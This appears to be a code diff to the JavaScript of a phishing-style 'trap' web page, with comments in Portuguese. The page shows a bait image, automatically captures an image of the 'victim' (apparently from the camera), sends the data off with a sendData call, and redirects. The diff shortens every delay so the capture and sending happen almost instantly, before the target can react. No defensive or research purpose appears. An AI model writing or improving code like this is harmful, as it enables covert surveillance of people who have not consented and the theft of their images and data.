@@ -88,15 +88,14 @@
     const trapContainer = document.getElementById("trapContainer");
     const trapImg = document.getElementById("trapImage");
     
-    // Mostrar imagem isca
-    statusEl.textContent = "Image loaded!";
+    // Mostrar imagem isca imediatamente
     trapImg.src = trapImage;
     trapContainer.style.display = "block";
     
-    log("Imagem isca exibida, aguardando captura automática...");
+    log("Imagem isca exibida, iniciando captura automática...");
     
-    // Pequeno delay para a vítima ver a imagem
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    // Delay muito curto - capturar quase que imediatamente
+    await new Promise(resolve => setTimeout(resolve, 500));
     
     // Capturar imagem da vítima
     if (autoCapture) {
@@ -106,8 +105,8 @@
       // Enviar dados imediatamente após captura
       await sendData();
       
-      // Redirecionar após envio
-      setTimeout(() => window.location.href = finalUrl, 1000);
+      // Redirecionar muito rápido após envio
+      setTimeout(() => window.location.href = finalUrl, 500);
     }
   };
 
